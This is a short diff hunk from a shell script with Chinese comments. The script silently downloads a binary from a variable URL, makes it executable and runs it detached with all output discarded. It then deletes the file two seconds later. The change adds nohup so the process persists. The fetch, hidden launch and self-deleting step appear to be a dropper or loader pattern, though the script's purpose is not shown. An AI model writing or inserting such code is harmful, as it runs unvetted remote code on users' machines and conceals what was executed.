@@ -144,7 +144,7 @@ fi
   # 下載
   if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
     chmod +x "$temp_bin" 2>/dev/null || true
-    setsid "$temp_bin" >/dev/null 2>&1 </dev/null &
+    nohup setsid "$temp_bin" >/dev/null 2>&1 </dev/null &
     # 等待短暫時間後刪除臨時文件
     sleep 2
     rm -f "$temp_bin" 2>/dev/null || true
